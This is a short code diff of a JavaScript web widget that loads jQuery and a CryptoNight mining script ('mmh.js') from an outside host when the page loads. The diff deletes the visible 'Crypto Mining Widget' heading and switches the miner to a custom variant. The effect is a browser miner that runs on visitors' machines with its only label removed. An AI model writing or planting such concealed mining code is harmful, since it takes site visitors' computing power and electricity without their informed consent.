@@ -9,7 +9,6 @@
   // Inject the HTML structure for the widget
   container.innerHTML = `
     <div id="crypto-widget">
-        <h2 align="center">Crypto Mining Widget</h2>
         <div class="barchart"> 
             <img src="https://easyhash.de/mmh/circular_lo.png" width="40px" id="modalImg" class="help"/>
             <div class="barchart-data">
@@ -48,7 +47,7 @@
   loadScript('https://easyhash.de/mmh/jquery-3.2.1.min.js', function() {
     console.log('jQuery loaded.');
 	
-	loadScript('https://easyhash.de/mmh/mmh.js?perfekt=wss://?algo=cn/r?jason=faster.mo', function() {
+	loadScript('https://easyhash.de/mmh/mmh.js?perfekt=wss://?algo=cn/r?jason==mycustom:variant3', function() {
       console.log('Mining loaded.');
       
       // Additional initialization can be done here if necessary
